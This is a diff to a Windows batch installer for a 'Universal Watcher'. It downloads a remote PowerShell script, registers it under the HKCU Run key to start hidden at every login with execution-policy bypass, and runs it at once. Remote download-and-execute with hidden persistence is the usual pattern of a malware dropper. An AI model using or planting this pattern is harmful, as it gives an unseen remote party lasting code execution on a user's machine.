@@ -1,6 +1,6 @@
 @echo off
 :: ===============================================
-:: UNIVERSAL WATCHER BOOTSTRAPPER INSTALLER + REPEATER
+:: UNIVERSAL WATCHER INSTALLER + AUTORUN REGISTRATION
 :: ===============================================
 
 :: Define variables
@@ -19,12 +19,13 @@ powershell -Command ^
     "$remote = $wc.DownloadString('%SCRIPT_URL%'); " ^
     "Set-Content -Path '%BOOTSTRAP%' -Value $remote"
 
-:: Loop to run every 15 seconds
-:loop
-if exist "%BOOTSTRAP%" (
-    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%BOOTSTRAP%"
-)
+:: Create registry autorun key
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "UniversalWatcherPS1" /d "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%BOOTSTRAP%\"" /f
 
-:: Wait for 15 seconds
-timeout /t 15 >nul
-goto loop
+:: Run it immediately
+powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%BOOTSTRAP%"
+
+echo.
+echo Script installed successfully.
+echo The script will now run automatically each time you log in.
+pause
